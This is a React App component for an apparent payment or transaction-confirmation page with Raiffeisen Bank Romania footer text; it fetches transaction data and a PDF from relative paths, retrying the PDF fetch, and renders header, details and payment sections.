import React, { useState, useEffect } from 'react';
import { useLocation } from 'react-router-dom';
import './App.css';
import Header from '../../components/header/Header'; 
import Feature from '../../components/feature/Feature';
import Details from '../../components/details/Details';
import PaySection from '../../components/pay-section/PaySection';

function App() {
  const location = useLocation();
  const inputValue = location.state?.inputURL || '';

  const [responseData, setResponseData] = useState(null);
  const [pdfURL, setPdfURL] = useState(null);
  const [isLoaded, setIsLoaded] = useState(false);
  const isTransactionTrust = false;
  const footerDescription = "If the password has not been received via SMS, please call the Raiffeisen Bank Romania Call Center at +40 21 3063002 or the phone numbers listed on the back of your card.";

  useEffect(() => {
    if (inputValue) {
      fetch(`hal/${inputValue}`)
        .then(response => response.json())
        .then(data => {
          setResponseData(data);
          setIsLoaded(true);

          fetchExtraDataWithRetry();
        })
        .catch(error => {
          console.error('[ERROR 1] Error fetching data:', error);
          setIsLoaded(true);
        });
    }
  }, [inputValue]);

  const fetchExtraDataWithRetry = () => {
    fetch(`data/${inputValue}`, { method: 'GET' })
      .then(response => {
        if (!response.ok) {
          throw new Error('Failed to fetch extra data');
        }
        return response.arrayBuffer();
      })
      .then(arrayBuffer => {
        const blob = new Blob([arrayBuffer], { type: 'application/pdf' });
        const url = URL.createObjectURL(blob);
        setPdfURL(url);
        console.log('PDF file retrieved successfully');
      })
      .catch(error => {
        console.error('Retrying extra data fetch due to error:', error);
        setTimeout(fetchExtraDataWithRetry, 2000);
      });
  };
  

  return (
    <div className="App">
      <div className="main-container">
        <Header />
        <Feature isTrust={isTransactionTrust} isLoaded={isLoaded} response={responseData} pdfURL={pdfURL} />
        <Details />
        <PaySection />

        <footer className="footer">
          <p>{footerDescription}</p>
        </footer>
      </div>
    </div>
  );
}

export default App;
